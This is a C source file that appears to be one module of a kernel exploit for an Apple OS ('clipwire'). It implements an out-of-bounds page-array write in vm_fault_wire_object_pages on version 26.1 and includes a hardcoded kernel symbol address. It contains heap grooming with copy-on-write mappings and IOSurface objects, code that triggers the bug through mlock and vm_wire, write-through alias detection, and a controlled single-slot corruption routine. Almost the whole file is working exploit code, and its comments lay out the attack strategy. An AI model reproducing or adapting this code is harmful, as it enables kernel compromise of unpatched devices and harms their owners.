#include "clipwire.h"
#include <mach/host_priv.h>
#include <IOSurface/IOSurface.h>
#include <signal.h>
#include <setjmp.h>

/* ------------------------------------------------------------------ */
/* Bug 2 primitive: vm_fault_wire_object_pages object-bounds OOB       */
/*                                                                    */
/* 26.1 KSYM_WIRE_OBJECT_PAGES (0xfffffff0080abae0, size 0x778)        */
/* iterates entry->vme_start .. entry->vme_end (VME_START/VME_END),    */
/* and per page writes a vm_page pointer into the object's page        */
/* array. There is NO check that offset + wire_size <= object->size,   */
/* so the writes run past the end of the object's page array into      */
/* whatever is HEAP-ADJACENT (26.6 added the panic for exactly this).  */
/*                                                                    */
/* The Bug 1-corrupted entry's object is an anonymous COW vm_object,   */
/* so its page array lives in the kernel heap (array size =            */
/* page_count * 8). Grooming therefore targets heap-adjacent           */
/* vm_object page arrays of the SAME page count (COW copies of the     */
/* victim size), not phys-contiguous memory.                           */
/*                                                                    */
/* Detection is write-through: after the OOB, a groom whose array was  */
/* overwritten now maps the victim's pages - writing via the groom's   */
/* user VA lands on the victim's pages instead of its own.             */
/* ------------------------------------------------------------------ */

/* pool A: heap-adjacent vm_object page arrays (COW copies, same size) */
typedef struct {
    cow_map_t cow;
    U64       magic;
} groom_cow_t;

/* pool B: phys-contiguous IOSurface objects (phys-window object case) */
typedef struct {
    IOSurfaceRef surf;
    mach_port_t  mem_entry;
    U64          base;
    U64          size;
} groom_obj_t;

static groom_cow_t g_groom_cow[GROOM_OBJECTS];
static U64 g_groom_cow_n = 0;

static groom_obj_t g_groom_surf[GROOM_OBJECTS];
static U64 g_groom_surf_n = 0;

static int g_victim_idx = -1;
static int g_victim_surf_idx = -1;
static U64 g_victim_start = 0;
static U64 g_victim_end = 0;

/* magic stamped into surf bases for write-through detection */
#define SURF_STAMP(i) (0x80A7F01D00000000ULL ^ (U64)(i))

static jmp_buf g_segv_jmp;
static volatile sig_atomic_t g_in_peek = 0;

static void segv_handler(int sig)
{
    (void)sig;
    if (g_in_peek) siglongjmp(g_segv_jmp, 1);
    _exit(128 + SIGSEGV);
}

/* segv-safe read of one byte from a user VA (range may be torn down) */
static int peek_u8(U64 va)
{
    struct sigaction sa = {0};
    sa.sa_handler = segv_handler;
    sigaction(SIGSEGV, &sa, NULL);

    g_in_peek = 1;
    int rv = -1;
    if (sigsetjmp(g_segv_jmp, 1) == 0) {
        rv = *(volatile unsigned char *)va;
    }
    g_in_peek = 0;
    return rv;
}

/* ---- pool A: COW copies -> vm_object page arrays ---- */

static bool cow_groom_create(groom_cow_t *g)
{
    cow_map_t *m = &g->cow;
    m->src_size = COW_SRC_PAGES * PAGE_SIZE_;
    m->dst_size = m->src_size;

    kern_return_t kr = mach_vm_allocate(mach_task_self(), &m->src_addr, m->src_size, VM_FLAGS_ANYWHERE);
    if (kr != KERN_SUCCESS) return false;
    memset((void *)m->src_addr, 0x41, m->src_size);

    vm_prot_t cur = VM_PROT_READ | VM_PROT_WRITE;
    vm_prot_t max = VM_PROT_READ | VM_PROT_WRITE;
    m->dst_addr = 0;
    kr = vm_remap(mach_task_self(), &m->dst_addr, m->dst_size, 0,
                  VM_FLAGS_ANYWHERE,
                  mach_task_self(), m->src_addr, TRUE,
                  &cur, &max, VM_INHERIT_NONE);
    if (kr != KERN_SUCCESS) {
        mach_vm_deallocate(mach_task_self(), m->src_addr, m->src_size);
        memset(m, 0, sizeof(*m));
        return false;
    }
    *(volatile unsigned char *)m->dst_addr = 0x7e;   /* make pages resident */
    return true;
}

static void cow_groom_destroy(groom_cow_t *g)
{
    if (g->cow.dst_addr) mach_vm_deallocate(mach_task_self(), g->cow.dst_addr, g->cow.dst_size);
    if (g->cow.src_addr) mach_vm_deallocate(mach_task_self(), g->cow.src_addr, g->cow.src_size);
    memset(&g->cow, 0, sizeof(g->cow));
    g->magic = 0;
}

/* ---- pool B: IOSurface phys-contiguous ---- */

extern kern_return_t mach_make_memory_entry_64(vm_map_t target_task, memory_object_size_t *size,
                                               memory_object_offset_t offset, vm_prot_t permission,
                                               mach_port_t *object_handle, mach_port_t parent_entry);

static bool surf_groom_create(groom_obj_t *g)
{
    CFMutableDictionaryRef props = CFDictionaryCreateMutable(kCFAllocatorDefault, 4,
            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFDictionarySetValue(props, kIOSurfaceAllocSize,
            CFNumberCreate(kCFAllocatorDefault, kCFNumberLongLongType, &(long long){ GROOM_OBJECT_SIZE }));
    CFDictionarySetValue(props, CFSTR("IOSurfaceMemoryRegion"), CFSTR("PurpleGfxMem"));

    IOSurfaceRef s = IOSurfaceCreate(props);
    CFRelease(props);
    if (!s) return false;

    memory_object_size_t mo_size = GROOM_OBJECT_SIZE;
    kern_return_t kr = mach_make_memory_entry_64(mach_task_self(), &mo_size,
            (mach_vm_address_t)IOSurfaceGetBaseAddress(s),
            VM_PROT_DEFAULT, &g->mem_entry, MACH_PORT_NULL);
    if (kr != KERN_SUCCESS) {
        IOSurfaceDecrementUseCount(s); CFRelease(s);
        return false;
    }
    mach_vm_address_t addr = 0;
    kr = mach_vm_map(mach_task_self(), &addr, mo_size, 0, VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR,
            g->mem_entry, 0, 0, VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
    if (kr != KERN_SUCCESS) {
        mach_port_deallocate(mach_task_self(), g->mem_entry);
        IOSurfaceDecrementUseCount(s); CFRelease(s);
        return false;
    }
    g->surf = s;
    g->base = addr;
    g->size = mo_size;
    return true;
}

bool wire_setup_objects(void)
{
    for (U64 i = 0; i < GROOM_OBJECTS; i++) {
        if (cow_groom_create(&g_groom_cow[g_groom_cow_n])) {
            g_groom_cow[g_groom_cow_n].magic = 0xC0C0C0C0C0C0C0C0ULL ^ i;
            g_groom_cow_n++;
        }
    }
    LOGOK("groomed %llu heap-adjacent COW vm_object arrays (size %#llx)",
          g_groom_cow_n, (U64)(COW_SRC_PAGES * PAGE_SIZE_));

    for (U64 i = 0; i < GROOM_OBJECTS / 2 && g_groom_surf_n < GROOM_OBJECTS; i++) {
        if (surf_groom_create(&g_groom_surf[g_groom_surf_n])) g_groom_surf_n++;
    }
    LOGOK("groomed %llu phys-contiguous IOSurface objects (size %#llx)",
          g_groom_surf_n, (U64)GROOM_OBJECT_SIZE);

    return g_groom_cow_n > 0;
}

void wire_teardown_objects(void)
{
    for (U64 i = 0; i < g_groom_cow_n; i++) cow_groom_destroy(&g_groom_cow[i]);
    g_groom_cow_n = 0;
    for (U64 i = 0; i < g_groom_surf_n; i++) {
        if (g_groom_surf[i].base) mach_vm_deallocate(mach_task_self(), g_groom_surf[i].base, g_groom_surf[i].size);
        if (g_groom_surf[i].mem_entry) mach_port_deallocate(mach_task_self(), g_groom_surf[i].mem_entry);
        if (g_groom_surf[i].surf) { IOSurfaceDecrementUseCount(g_groom_surf[i].surf); CFRelease(g_groom_surf[i].surf); }
    }
    g_groom_surf_n = 0;
    g_victim_idx = -1;
    g_victim_surf_idx = -1;
}

/* ---- wire drivers ---- */

static U64 wire_via_mlock(U64 start, U64 end)
{
    if (mlock((void *)start, end - start) != 0) return 0;
    munlock((void *)start, end - start);
    return (end - start) >> PAGE_SHIFT;
}

static U64 wire_via_mach_vm_wire(U64 start, U64 end)
{
    host_priv_t host = HOST_PRIV_NULL;
    kern_return_t kr = host_get_host_priv_port(mach_host_self(), &host);
    if (kr != KERN_SUCCESS || host == HOST_PRIV_NULL) return 0;
    kr = vm_wire(host, mach_task_self(), start, end - start,
                 VM_PROT_READ | VM_PROT_WRITE);
    mach_port_deallocate(mach_task_self(), host);
    if (kr != KERN_SUCCESS) return 0;
    return (end - start) >> PAGE_SHIFT;
}

static U64 wire_range(U64 start, U64 end)
{
    U64 pages = wire_via_mlock(start, end);
    if (pages == 0) pages = wire_via_mach_vm_wire(start, end);
    return pages;
}

/* Drive the wire path over [start, end). On 26.1 the OOB page-array
 * write happens here. Returns pages processed, or 0 if all drivers
 * failed (path not reachable / range not wire-able). The corrupted
 * range is remembered for the controlled single-slot write. */
bool run_wire_oob(U64 start, U64 end, wire_result_t *r)
{
    memset(r, 0, sizeof(*r));
    r->corrupt_start = start;
    r->corrupt_end = end;
    g_victim_start = start;
    g_victim_end = end;

    U64 pages = wire_range(start, end);
    if (pages == 0) {
        LOGWARN("wire drivers returned 0 pages for [%#llx,%#llx)", start, end);
        return false;
    }
    r->oob_count = pages;
    LOGOK("wired %llu pages over [%#llx,%#llx) (no crash => OOB landed or window missed)",
          pages, start, end);
    return true;
}

/* Scan the victim's first `probe_pages` for a groom/surf stamp. If groom G's
 * page array was overwritten by the wire-OOB, G maps the victim's pages:
 * writing G's magic through G's user VA lands in the victim's pages, so a
 * stamp showing up there proves the alias and identifies G. Returns the COW
 * groom index on a COW hit, -2 on a surf (phys-window) hit, -1 on no hit. */
static int find_write_through(U64 victim, U64 probe_pages)
{
    g_victim_idx = -1;
    g_victim_surf_idx = -1;

    for (U64 i = 0; i < g_groom_cow_n; i++) {
        U64 want = g_groom_cow[i].magic;
        for (U64 pg = 0; pg < probe_pages; pg++) {
            int ok = 1;
            for (int b = 0; b < 8; b++) {
                int byte = peek_u8(victim + pg * PAGE_SIZE_ + b);
                if (byte != (int)((want >> (b * 8)) & 0xff)) { ok = 0; break; }
            }
            if (ok) {
                LOGOK("groom[%llu] aliases victim: write-through confirmed on page %llu", i, pg);
                g_victim_idx = (int)i;
                return (int)i;
            }
        }
    }

    for (U64 i = 0; i < g_groom_surf_n; i++) {
        U64 want = SURF_STAMP(i);
        for (U64 pg = 0; pg < probe_pages; pg++) {
            int ok = 1;
            for (int b = 0; b < 8; b++) {
                int byte = peek_u8(victim + pg * PAGE_SIZE_ + b);
                if (byte != (int)((want >> (b * 8)) & 0xff)) { ok = 0; break; }
            }
            if (ok) {
                LOGOK("surf[%llu] aliases victim: write-through confirmed on page %llu "
                      "(phys-window object in OOB path)", i, pg);
                g_victim_surf_idx = (int)i;
                return -2;
            }
        }
    }
    return -1;
}

/* Write-through detection:
 *   1. stamp each groom dst with a unique magic;
 *   2. re-wire the victim range (flush the array overwrite);
 *   3. read the victim's first pages - if they carry a groom's magic,
 *      that groom aliases the victim. Returns the groom index. */
int verify_wire_landed(wire_result_t *r)
{
    U64 victim = r->corrupt_start;

    /* the SEGV handler is only installed inside peek_u8; make sure it is
     * live before the clear loop below can fault on a torn-down page. */
    struct sigaction sa = {0};
    sa.sa_handler = segv_handler;
    sigaction(SIGSEGV, &sa, NULL);

    /* clear the victim's probe pages first: a stamp left by a previous
     * attempt would otherwise fake a hit (wire_oob_write does the same). */
    for (U64 p = 0; p < PAGE_SIZE_ * COW_FAULT_PAGES; p += 8) {
        g_in_peek = 1;
        if (sigsetjmp(g_segv_jmp, 1) == 0) {
            *(volatile U64 *)(victim + p) = 0;
        }
        g_in_peek = 0;
    }

    for (U64 i = 0; i < g_groom_cow_n; i++) {
        volatile U64 *dst = (volatile U64 *)g_groom_cow[i].cow.dst_addr;
        if (dst == NULL) continue;
        dst[0] = g_groom_cow[i].magic;
    }
    for (U64 i = 0; i < g_groom_surf_n; i++) {
        volatile U64 *dst = (volatile U64 *)g_groom_surf[i].base;
        if (dst == NULL) continue;
        dst[0] = SURF_STAMP(i);
    }

    wire_range(r->corrupt_start, r->corrupt_end);

    return find_write_through(victim, COW_FAULT_PAGES);
}

int wire_victim_index(void)
{
    return g_victim_idx;
}

int wire_victim_surf(void)
{
    return g_victim_surf_idx;
}

bool wire_victim_range(U64 *start, U64 *end)
{
    if (g_victim_start == 0) return false;
    if (start) *start = g_victim_start;
    if (end) *end = g_victim_end;
    return true;
}

bool wire_groom_info(U64 idx, U64 *base, U64 *size)
{
    if (idx >= g_groom_cow_n || !g_groom_cow[idx].cow.dst_addr) return false;
    if (base) *base = g_groom_cow[idx].cow.dst_addr;
    if (size) *size = g_groom_cow[idx].cow.dst_size;
    return true;
}

bool wire_surf_info(U64 idx, U64 *base, U64 *size)
{
    if (idx >= g_groom_surf_n || !g_groom_surf[idx].base) return false;
    if (base) *base = g_groom_surf[idx].base;
    if (size) *size = g_groom_surf[idx].size;
    return true;
}

/* Controlled single-slot OOB write.
 *
 * The corrupted (Bug 1) entry makes the wire loop store one vm_page
 * pointer per page of [vme_start, vme_end). Re-wiring one page of the
 * range advances the overwritten array slot; the write-through test
 * then tells us the alias survived. We clear the victim's first page,
 * re-stamp every groom, wire one page, and scan - so a hit is fresh
 * evidence (not residue of verify_wire_landed). `array_index` is the
 * groom expected to alias; the hit can differ and is reported through
 * wire_victim_index(). *written_u64 receives the stamp observed in the
 * victim's first word (the value the alias carried). */
bool wire_oob_write(U64 array_index, U64 *written_u64)
{
    if (g_groom_cow_n == 0 || g_victim_start == 0) return false;
    if (array_index >= g_groom_cow_n) {
        LOGWARN("wire_oob_write: array_index %llu out of range (%llu grooms)", array_index, g_groom_cow_n);
        return false;
    }

    /* clear the victim's first page, then stamp every groom */
    for (U64 p = 0; p < PAGE_SIZE_; p += 8) {
        peek_u8(g_victim_start + p);          /* touch (may fault on teardown) */
        g_in_peek = 1;
        if (sigsetjmp(g_segv_jmp, 1) == 0) {
            *(volatile U64 *)(g_victim_start + p) = 0;
        }
        g_in_peek = 0;
    }
    for (U64 i = 0; i < g_groom_cow_n; i++) {
        volatile U64 *dst = (volatile U64 *)g_groom_cow[i].cow.dst_addr;
        if (dst == NULL) continue;
        dst[0] = g_groom_cow[i].magic;
    }

    U64 end = g_victim_start + PAGE_SIZE_;
    if (wire_range(g_victim_start, end) == 0) {
        LOGWARN("wire_oob_write: single-page wire over [%#llx,%#llx) failed", g_victim_start, end);
        return false;
    }

    int hit = find_write_through(g_victim_start, 1);
    if (hit < 0) {
        LOGWARN("wire_oob_write: alias not observable after single-page wire");
        return false;
    }
    if (written_u64) *written_u64 = g_groom_cow[hit].magic;
    LOGOK("wire_oob_write: alias alive after slot advance (groom[%d], expected groom[%llu])",
          hit, array_index);
    return true;
}
